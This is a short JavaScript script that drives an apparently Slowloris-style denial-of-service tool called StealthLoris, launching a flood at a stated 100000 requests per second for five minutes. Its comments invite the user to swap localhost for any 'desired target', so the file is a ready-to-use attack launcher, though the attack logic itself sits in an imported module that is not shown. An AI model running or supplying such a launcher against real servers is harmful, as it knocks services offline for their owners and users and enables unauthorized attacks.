import StealthLoris from '../index.mjs';

import { setTimeout } from 'node:timers/promises';

async function runTest() {
    // Change the target URL and port to your desired target
    // 100000 is the number of requests per second
    const attacker = new StealthLoris('http://localhost:80', 100000);
    
    // Start the attack
    await attacker.start();
    
    // 300000 is the duration of the attack in milliseconds
    await setTimeout(300000, 'Attack Finished');
    
    // Stop the attack
    attacker.stop();
}

runTest().catch(console.error);
